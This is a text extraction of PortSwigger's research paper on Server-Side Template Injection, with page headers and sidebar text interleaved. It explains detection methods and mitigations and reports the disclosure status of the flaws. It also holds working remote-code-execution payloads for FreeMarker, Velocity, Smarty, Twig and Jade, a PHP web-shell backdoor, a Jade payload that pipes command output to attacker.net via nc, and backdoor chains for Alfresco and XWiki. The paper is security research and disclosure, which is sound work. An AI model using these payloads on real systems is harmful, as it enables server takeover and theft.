{
    "title": "Server-Side Template Injection | PortSwigger Research",
    "text": "01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 1 di 18https://portswigger.net/research/server-side-template-injection LOGINServer-Side Template Injection James KettleDirector of Research@albinowaxPublished: 05 August 2015 at19:00 UTCUpdated: 16 August 2022 at 09:30UTC Template engines are widely used by web applications to present dynamic data via web pages and emails.Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently criticalvulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, TemplateInjection can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE),turning every vulnerable application into a potential pivot point.Template Injection can arise both through developer error, and through the intentional exposure of templates in anattempt to offer rich functionality, as commonly done by wikis, blogs, marketing applications and contentmanagement systems. Intentional template injection is such a common use-case that many template engines offera 'sandboxed' mode for this express purpose. This paper defines a methodology for detecting and exploitingtemplate injection, and shows it being applied to craft RCE zerodays for two widely deployed enterprise webArticles01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 2 di 18https://portswigger.net/research/server-side-template-injectionapplications. Generic exploits are demonstrated for five of the most popular template engines, including escapesfrom sandboxes whose entire purpose is to handle user-supplied templates in a safe way.For a slightly less dry account of this research, you may prefer to watch my Black Hat USA presentation on thistopic. This research is also available as printable whitepaper, and you can find an overview with interactive labs inour Web Security Academy. IntroductionWeb applications frequently use template systems such as Twig and FreeMarker to embed dynamic content in webpages and emails. Template Injection occurs when user input is embedded in a template in an unsafe manner.Consider a marketing application that sends bulk emails, and uses a Twig template to greet recipients by name. Ifthe name is merely passed in to the template, as in the following example, everything works fine:$output = $twig->render(\"Dear {first_name},\", array(\"first_name\" => $user.first_name) ); However, if users are allowed to customize these emails, problems arise:$output = $twig->render($_GET['custom_email'],  array(\"first_name\" => $user.first_name) );In this example the user controls the content of the template itself via the custom_email GET parameter, ratherthan a value passed into it. This results in an XSS vulnerability that is hard to miss. However, the XSS is just asymptom of a subtler, more serious vulnerability. This code actually exposes an expansive but easily overlookedattack surface. The output from the following two greeting messages hints at a server-side vulnerability:custom_email={{7*7}}49custom_email={{self}}Object of class __TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5  Server-Side Template Injection: RCE For The Modern Web App01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 3 di 18https://portswigger.net/research/server-side-template-injectioncould not be converted to stringWhat we have here is essentially server-side code execution inside a sandbox. Depending on the template engineused, it may be possible to escape the sandbox and execute arbitrary code.This vulnerability typically arises through developers intentionally letting users submit or edit templates - sometemplate engines offer a secure mode for this express purpose. It is far from specific to marketing applications - anyfeatures that support advanced user-supplied markup may be vulnerable, including wiki-pages, reviews, and evencomments. Template injection can also arise by accident, when user input is simply concatenated directly into atemplate. This may seem slightly counter-intuitive, but it is equivalent to SQL Injection vulnerabilities occurring inpoorly written prepared statements, which are a relatively common occurrence. Furthermore, unintentional templateinjection is extremely easy to miss as there typically won't be any visible cues. As with all input basedvulnerabilities, the input could originate from out of band sources. For example, it may occur as a Local File Include(LFI) variant, exploitable through classic LFI techniques such as code embedded in log files, session files, or /proc/self/env.The 'Server-Side' qualifier is used to distinguish this from vulnerabilities in client-side templating libraries such asthose provided by jQuery and KnockoutJS. Client-side template injection can often be abused for XSS attacks, asdetailed by Mario Heiderich. This paper will exclusively cover attacking server-side templating, with the goal ofobtaining arbitrary code execution.Template Injection methodologyI have defined the following high level methodology to capture an efficient attack process, based on my experienceauditing a range of vulnerable applications and template engines:01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 4 di 18https://portswigger.net/research/server-side-template-injection DetectThis vulnerability can appear in two distinct contexts, each of which requires its own detection method:1. Plaintext contextMost template languages support a freeform 'text' context where you can directly input HTML. It will typically appearin one of the following ways:smarty=Hello {user.name}Hello user1 freemarker=Hello ${username}Hello newuser any=<b>Hello</b><b>Hello<b> 01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 5 di 18https://portswigger.net/research/server-side-template-injectionThis frequently results in XSS, so the presence of XSS can be used as a cue for more thorough template injectionprobes. Template languages use syntax chosen explicitly not to clash with characters used in normal HTML, so it'seasy for a manual blackbox security assessment to miss template injection entirely. To detect it, we need to invokethe template engine by embedding a statement. There are a huge number of template languages but many of themshare basic syntax characteristics. We can take advantage of this by sending generic, template-agnostic payloadsusing basic operations to detect multiple template engines with a single HTTP request:smarty=Hello ${7*7}Hello 49freemarker=Hello ${7*7}Hello 492. Code contextUser input may also be placed within a template statement, typically as a variable name:personal_greeting=usernameHello user01 This variant is even easier to miss during an assessment, as it doesn't result in obvious XSS and is almostindistinguishable from a simple hashmap lookup. Changing the value from username will typically either result ina blank result or the application erroring out. It can be detected in a robust manner by verifying the parameterdoesn't have direct XSS, then breaking out of the template statement and injecting HTML tag after it:personal_greeting=username<tag>Hello personal_greeting=username}}<tag>Hello user01 <tag> IdentifyAfter detecting template injection, the next step is to identify the template engine in use. This step is sometimes astrivial as submitting invalid syntax, as template engines may identify themselves in the resulting error messages.However, this technique fails when error messages are supressed, and isn't well suited for automation. We haveinstead automated this in Burp Suite using a decision tree of language-specific payloads. Green and red arrowsrepresent 'success' and 'failure' responses respectively. In some cases, a single payload can have multiple distinctsuccess responses - for example, the probe {{7*'7'}} would result in 49 in Twig, 7777777 in Jinja2, and neitherif no template language is in use.01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 6 di 18https://portswigger.net/research/server-side-template-injection ExploitReadThe first step after finding template injection and identifying the template engine is to read the documentation. Theimportance of this step should not be underestimated; one of the zeroday exploits to follow was derived purely fromstudious documentation perusal. Key areas of interest are:'For Template Authors' sections covering basic syntax.'Security Considerations' - chances are whoever developed the app you're testing didn't read this, and it maycontain some useful hints.Lists of builtin methods, functions, filters, and variables.Lists of extensions/plugins - some may be enabled by default.ExploreAssuming no exploits have presented themselves, the next step is to explore the environment to find out exactlywhat you have access to. You can expect to find both default objects provided by the template engine, andapplication-specific objects passed in to the template by the developer. Many template systems expose a 'self' ornamespace object containing everything in scope, and an idiomatic way to list an object's attributes and methods.If there's no builtin self object you're going to have to bruteforce variable names. I have created a wordlist for this bycrawling GitHub for GET/POST variable names used in PHP projects, and publicly released it via SecLists andBurp Intruder's wordlist collection.Developer-supplied objects are particularly likely to contain sensitive information, and may vary between differenttemplates within an application, so this process should ideally be applied to every distinct template individually.AttackAt this point you should have a firm idea of the attack surface available to you and be able to proceed withtraditional security audit techniques, reviewing each function for exploitable vulnerabilities. It's important toapproach this in the context of the wider application - some functions can be used to exploit application-specificfeatures. The examples to follow will use template injection to trigger arbitrary object creation, arbitrary file01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 7 di 18https://portswigger.net/research/server-side-template-injectionread/write, remote file include, information disclosure and privilege escalation vulnerabilities.Exploit developmentI have audited a range of popular template engines to show the exploit methodology in practice, and make a casefor the severity of the issue. The findings may appear to show flaws in template engines themselves, but unless anengine markets itself as suitable for user-submitted templates the responsibility for preventing template injectionultimately lies with web application developers.Sometimes, thirty seconds of documentation perusal is sufficient to gain RCE. For example, exploitingunsandboxed Smarty is as easy as:{php}echo `id`;{/php}Mako is similarly easy to exploit:<%import osx=os.popen('id').read()%>${x}However, many template engines try to prevent application logic from creeping into templates by restricting theirability to execute arbitrary code. Others explicitly try to restrict and sandbox templates as a security measure toenable safe processing of untrusted input. Between these measures, developing a template backdoor can provequite a challenging process.FreeMarkerFreeMarker is one of the most popular Java template languages, and the language I've seen exposed to usersmost frequently. This makes it surprising that the official website explains the dangers of allowing user-suppliedtemplates: Buried behind some lesser risks like Denial of Service, we find this:The new built-in (Configuration.setNewBuiltinClassResolver, Environment.setNewBuiltinClassResolver): It's used in templates like \"com.example.SomeClass\"?new(), and is important for FTL librariesthat are partially implemented in Java, but shouldn't be needed in normal templates. While new will not instantiateclasses that are not TemplateModel-s, FreeMarker contains a TemplateModel class that can be used tocreate arbitrary Java objects. Other \"dangerous\" TemplateModel-s can exist in you class-path. Plus, even if aclass doesn't implement TemplateModel, its static initialization will be run. To avoid these, you should use a TemplateClassResolver that restricts the accessible classes (possibly based on which template asks for them),such as TemplateClassResolver.ALLOWS_NOTHING_RESOLVER.This warning is slightly cryptic, but it does suggest that the new builtin may offer a promising avenue ofexploitation. Let's have a look at the documentation on new:23. Can I allow users to upload templates and what are the security implications?In general you shouldn't allow that, unless those users are system administrators or other trustedpersonnel. Consider templates as part of the source code just like *.java files are. If you still want to allowusers to upload templates, here are what to consider:- http://freemarker.org/docs/app_faq.html#faq_template_uploading_security This built-in can be a security concern because the template author can create arbitrary Java objects andthen use them, as far as they implement TemplateModel. Also the template author can trigger static01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 8 di 18https://portswigger.net/research/server-side-template-injectionAre there any useful classes implementing TemplateModel? Let's take a look at the JavaDoc: One of these class names stands out - Execute.The details confirm it does what you might expect - takes input and executes it: Using it is as easy as:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7) This payload will come in useful later.VelocityVelocity, another popular Java templating language, is trickier to exploit. There is no 'Security Considerations' pageto helpfully point out the most dangerous functions, and also no obvious list of default variables. The followingscreenshot shows the Burp Intruder tool being used to bruteforce variable names, with the variable name on the leftin the 'payload' column and the server's output on the right.initialization for classes that don't even implement TemplateModel. [snip] If you are allowing not-so-much-trusted users to upload templates then you should definitely look into this topic.- http://freemarker.org/docs/ref_builtins_expert.html#ref_builtin_new public class Executeimplements TemplateMethodModelGiven FreeMarker the ability to execute external commands. Will fork a process, and inline anything thatprocess sends to stdout in the template.01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 9 di 18https://portswigger.net/research/server-side-template-injection The class variable (highlighted) looks particularly promising because it returns a generic Object. Googling itleads us to https://velocity.apache.org/tools/releases/2.0/summary.html:One method and one property stand out:$class.inspect(class/object/string)returns a new ClassTool instance that inspects the specified class or object$class.typereturns the actual Class being inspectedhttps://velocity.apache.org/tools/releases/2.0/summary.htmlIn other words, we can chain $class.inspect with $class.type to obtain references to arbitrary objects.We can then execute arbitrary shell commands on the target system using Runtime.exec(). This can beconfirmed using the following template, designed to cause a noticeable time delay.$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"sleep 5\").waitFor()[5 second time delay] 0Getting the shell command's output is a bit trickier (this is Java after all):#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#endClassTool: tool meant to use Java reflection in templatesdefault key: $class01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 10 di 18https://portswigger.net/research/server-side-template-injectiontomcat7SmartySmarty is one of the most popular PHP template languages, and offers a secure mode for untrusted templateexecution. This enforces a whitelist of safe PHP functions, so templates can't directly invoke system(). However,it doesn't prevent us from invoking methods on any classes we can obtain a reference to. The documentationreveals that the $smarty builtin variable can be used to access various environment variables, including thelocation of the current file at $SCRIPT_NAME. Variable name bruteforcing quickly reveals the self object, which is areference to the current template. There is very little documentation on this, but the code is all on GitHub. The getStreamVariable method is invaluable: The getStreamVariable method can be used to read any file the server has read+write permission on:{self::getStreamVariable(\"file:///proc/self/loginuid\")}1000{self::getStreamVariable($SCRIPT_NAME)}<?phpdefine(\"SMARTY_DIR\",'/usr/share/php/Smarty/');require_once(SMARTY_DIR.'Smarty.class.php');... Furthermore, we can call arbitrary static methods. Smarty exposes a range of invaluable static classes, including Smarty_Internal_Write_File, which has the following method:01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 11 di 18https://portswigger.net/research/server-side-template-injectionpublic function writeFile($_filepath, $_contents, Smarty $smarty)This function is designed to create and overwrite arbitrary files, so it can easily be used to create a PHP backdoorinside the webroot, granting us near-complete control over the server. There's one catch - the third argument has aSmarty type hint, so it will reject any non-Smarty type inputs. This means that we need to obtain a reference toa Smarty object.Further code review reveals that the self::clearConfig() method is suitable:/*** Deassigns a single or all config variables** @param  string $varname variable name or null** @return Smarty_Internal_Data current Smarty_Internal_Data (or Smarty or Smarty_Internal_Template) instance for chaining*/public function clearConfig($varname = null){    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);}The final exploit, designed to overwrite the vulnerable file with a backdoor, looks like:{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}TwigTwig is another popular PHP templating language. It has restrictions similar to Smarty's secure mode by default,with a couple of significant additional limitations - it isn't possible to call static methods, and the return values fromall functions are cast to strings. This means we can't use functions to obtain object references like we did withSmarty's self::clearConfig(). Unlike Smarty, Twig has documented its self object (_self) so we don'tneed to bruteforce any variable names.The _self object doesn't contain any useful methods, but does have an env attribute that refers to a Twig_Environment object, which looks more promising. The setCache method on Twig_Environment can be usedto change the location Twig tries to load and execute compiled templates (PHP files) from. An obvious attack istherefore to introduce a Remote File Include vulnerability by setting the cache location to a remote server:{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}However, modern versions of PHP disable inclusion of remote files by default via allow_url_include, so thisapproach isn't much use.Further code review reveals a call to the dangerous call_user_func function on line 874, in the getFiltermethod. Provided we control the arguments to this, it can be used to invoke arbitrary PHP functions.public function getFilter($name){        [snip]        foreach ($this->filterCallbacks as $callback) {        if (false !== $filter = call_user_func($callback, $name)) {            return $filter;        }01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 12 di 18https://portswigger.net/research/server-side-template-injection    }    return false;}public function registerUndefinedFilterCallback($callable){    $this->filterCallbacks[] = $callable;} Executing arbitrary shell commands is thus just a matter of registering exec as a filter callback, then invoking getFilter:{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)Twig (sandboxed)Twig's sandbox introduces additional restrictions. It disables attribute retrieval and adds a whitelist of functions andmethod calls, so by default we outright can't call any functions, even methods on a developer-supplied object.Taken at face value, this makes exploitation pretty much impossible. Unfortunately, the source tells a different story:public function checkMethodAllowed($obj, $method){  if ($obj instanceof Twig_TemplateInterface || $obj instanceof Twig_Markup) {        return true;    }Thanks to this snippet we can call any method on objects that implement Twig_TemplateInterface, whichhappens to include _self. The _self object's displayBlock method offers a high-level gadget of sorts:public function displayBlock($name, array $context, array $blocks = array(), $useBlocks = true){    $name = (string) $name;    if ($useBlocks && isset($blocks[$name])) {        $template = $blocks[$name][0];        $block = $blocks[$name][1];    } elseif (isset($this->blocks[$name])) {        $template = $this->blocks[$name][0];        $block = $this->blocks[$name][1];    } else {        $template = null;        $block = null;    }    if (null !== $template) {        try {            $template->$block($context, $blocks);        } catch (Twig_Error $e) {The $template->$block($context, $blocks); call can be abused to bypass the function whitelist and callany method on any object the user can obtain a reference to. The following code will invoke the vulnerableMethod method on the userObject object, with no arguments.01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 13 di 18https://portswigger.net/research/server-side-template-injection{{_self.displayBlock(\"id\",[],{\"id\":[userObject,\"vulnerableMethod\"]})}}This can't be used to exploit the Twig_Environment->getFilter() method used earlier as there is no way toobtain a reference to the Environment object. However, it does mean that we can invoke methods on anyobjects the developer has passed into the template - the _context object's attributes can be iterated over to seeif anything useful is in scope. The XWiki example later illustrates exploiting a developer-provided class.JadeJade is a popular Node.js template engine. The website CodePen.io lets users submit templates in a number oflanguages by design, and is suitable for showing a purely blackbox exploitation process. For a visual depiction ofthe following steps, please refer to the presentation video (link pending).First off, confirm template execution:= 7*749 Locate the self object:= root[object global] Find a way to list object properties and functions:- var x = root- for(var prop in x)    , #{prop}, ArrayBuffer, Int8Array, Uint8Array, Uint8ClampedArray... global, process, GLOBAL, rootExplore promising objects:- var x = root.process- for(var prop in x)    , #{prop}, title, version, moduleLoadList... mainModule, setMaxListeners, emit, onceBypass trivial countermeasures:- var x = root.process.mainModule- for(var prop in x)    , #{prop}CodePen removed the words below from your Jade because they could be used to do bad things. Please remove them and try again.->process->mainModule- var x = root.process- x = x.mainModule- for(var prop in x)01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 14 di 18https://portswigger.net/research/server-side-template-injection    , #{prop}, id, exports, parent, filename, loaded, children, paths, load, require, _compile Locate useful functions:- var x = root.process- x = x.mainModule.require- x('a')Cannot find module 'a' Exploit:- var x = root.process- x = x.mainModule.require- x = x('child_process')= x.exec('id | nc attacker.net 80') Case study: AlfrescoAlfresco is a content management system (CMS) aimed at corporate users. Low privilege users can chain a storedXSS vulnerability in the comment system with FreeMarker template injection to gain a shell on the webserver. TheFreeMarker payload created earlier can be used directly without any modification, but I've expanded it into a classicbackdoor that executes the contents of the query string as a shell command:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(url.getArgs())}Low privilege users do not have permission to edit templates, but the stored XSS vulnerability can be used to forcean administrator to install our backdoor for us. I injected the following JavaScript to launch this attack:tok = /Alfresco-CSRFToken=([^;]*)/.exec(document.cookie)[1];tok = decodeURIComponent(tok)do_csrf = new XMLHttpRequest();do_csrf.open(\"POST\",\"http://\"+document.domain+\":8080/share/proxy/alfresco/api/node/workspace/SpacesStore/59d3cbdc-70cb-419e-a325-759a4c307304/formprocessor\",false);01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 15 di 18https://portswigger.net/research/server-side-template-injectiondo_csrf.setRequestHeader('Content-Type','application/json; charset=UTF-8');do_csrf.setRequestHeader('Alfresco-CSRFToken',tok);do_csrf.send('{\"prop_cm_name\":\"folder.get.html.ftl\",\"prop_cm_content\":\"&lgt;#assign ex=\\\\\"freemarker.template.utility.Execute\\\\\"?new()> ${ ex(url.getArgs())}\",\"prop_cm_description\":\"\"}');The GUID value of templates can change across installations, but it's easily visible to low privilege users via the'Data Dictionary'. Also, the administrative user is fairly restricted in the actions they can take, unlike otherapplications where administrators are intentionally granted complete control over the webserver. Note that according to Alfresco's own documentation, SELinux will do nothing to confine the resulting shell:- http://docs.alfresco.com/5.0/tasks/alfresco-start.htmlCase study: XWiki EnterpriseXWiki Enterprise is a feature-rich professional wiki. In the default configuration, anonymous users can registeraccounts on it and edit wiki pages, which can contain embedded Velocity template code. This makes it an excellenttarget for template injection. However, the generic Velocity payload created earlier will not work, as the $classhelper is not available.XWiki has the following to say about Velocity:It doesn't require special permissions since it runs in a Sandbox, with access to only a few safe objects, and each API call will check the rights configured in the wiki, forbidding access to resources or actions that the current user shouldn't be allowed to retrieve/perform. Other scripting language require the user that wrote the script to have Programming Rights to execute them, but except this initial precondition, access is granted to all the resources on the server. ...Without programming rights, it's impossible to instantiate new objects, except literals and those safely offered by the XWiki APIs. Nevertheless, the XWiki API is powerful enough to allow a wide range of applications to be safely developed, if \"the XWiki way\" is properly followed....Programming Rights are not required for viewing a page containing a script requiring Programming Rights, rights are only needed at save timehttp://platform.xwiki.org/xwiki/bin/view/DevGuide/ScriptingIn other words, XWiki doesn't just support Velocity - it also supports unsandboxed Groovy and Python scripting.However, these are restricted to users with programming rights. This is good to know because it turns privilegeescalation into arbitrary code execution. Since we can only use Velocity, we are limited to the XWiki APIs.The $doc class has some very interesting methods - astute readers may be able to identify an impliedvulnerability in the following:The content author of a wiki page is the user who last edited it. The presence of distinct save and saveAsAuthor methods implies that the save method does not save as the author, but as the person currently viewing the page.If you installed Alfresco using the setup wizard, the alfresco.sh script included in the installation disablesthe Security-Enhanced Linux (SELinux) feature across the system.01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 16 di 18https://portswigger.net/research/server-side-template-injectionIn other words, a low privilege user can create a wiki page that, when viewed by a user with programming rights,silently modifies itself and saves the modifications with those rights. To inject the following Python backdoor:{{python}}from subprocess import check_outputq = request.get('q') or 'true'q = q.split(' ')print ''+check_output(q)+''{{/python}}We just need to wrap it with some code to grab the privileges of a passing administrator:innocent content{{velocity}}#if( $doc.hasAccessLevel(\"programming\") )    $doc.setContent(\"        innocent content        {{python}}from subprocess import check_output        q = request.get('q') or 'true'        q = q.split(' ')        print ''+check_output(q)+''        {{/python}}    \")    $doc.save()#end{{/velocity}}As soon as a wiki page with this content is viewed by a user with programming rights, it will backdoor itself. Anyuser who subsequently views the page can use it to execute arbitrary shell commands: 01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 17 di 18https://portswigger.net/research/server-side-template-injectionAlthough I chose to exploit $doc.save, it is far from the only promising API method. Other potentially usefulmethods include $xwiki.getURLContent(\"http://internal-server.net\"), $request.getCookie(\"password\").getValue(), and $services.csrf.getToken().Mitigations - templating safelyIf user-supplied templates are a business requirement, how should they be implemented? We have already seenthat regexes are not an effective defense, and parser-level sandboxes are error prone. The lowest risk approach isto simply use a trivial template engine such as Mustache, or Python's Template. MediaWiki has taken the approachof executing users' code using a sandboxed Lua environment where potentially dangerous modules and functionshave been outright removed. This strategy appears to have held up well, given the lack of people compromisingWikipedia. In languages such as Ruby it may be possible to emulate this approach using monkey-patching.Another, complementary approach is to concede that arbitrary code execution is inevitable and sandbox it inside alocked-down Docker container. Through the use of capability-dropping, read-only filesystems, and kernel hardeningit is possible to craft a 'safe' environment that is difficult to escape from.Issue statusI do not consider the exploits shown for FreeMarker, Jade, Velocity and unsandboxed Twig to be vulnerabilities inthose languages, in the same way that the possibility of SQL injection is not the fault of MYSQL. The following tableshows the current status of the vulnerabilities disclosed in this paper.SoftwareStatusAlfrescoDisclosure acknowledged, patch in developmentXWikiNo fix available - XWiki developers do not have a consensus that this is a bugSmarty sandboxFixed in 3.1.24CodePenFixedTwig sandboxFixed in 1.20.0ConclusionTemplate Injection is only apparent to auditors who explicitly look for it, and may incorrectly appear to be lowseverity until resources are invested in assessing the template engine's security posture. This explains whyTemplate Injection has remained relatively unknown up till now, and its prevalence in the wild remains to bedetermined.Template engines are server-side sandboxes. As a result, allowing untrusted users to edit templates introduces anarray of serious risks, which may or may not be evident in the template system's documentation. Many moderntechnologies designed to prevent templates from doing harm are currently immature and should not be relied onexcept as a defense in depth measure. When Template Injection occurs, regardless of whether it was intentional, itis frequently a critical vulnerability that exposes the web application, the underlying webserver, and adjacentnetwork services.By thoroughly documenting this issue, and releasing automated detection via Burp Suite, we hope to raiseawareness of it and significantly reduce its prevalence.2020 update: We've just released some free, interactive labs so you can practise applying these techiques foryourself:01/04/24, 20:57Server-Side Template Injection | PortSwigger Research Pagina 18 di 18https://portswigger.net/research/server-side-template-injectionBurp SuiteWeb vulnerability scannerBurp Suite EditionsRelease Notes VulnerabilitiesCross-site scripting (XSS)SQL injectionCross-site request forgeryXML external entity injectionDirectory traversalServer-side request forgery CustomersOrganizationsTestersDevelopers CompanyAboutCareersContactLegalPrivacy Notice InsightsWeb Security AcademyBlogResearch Follow us  2024 PortSwigger Ltd.RCETemplate Injectionbounties0dayscannersJames FavouritesPresentationsBack to all articlesLABServer-Side Template Injection Labs Related Research Hiding payloads in Java source code strings 23 January 2024 Smashing the state machine the true potential of web race conditions 09 August 2023 Browser-PoweredDesync Attacks10 August 2022 "
}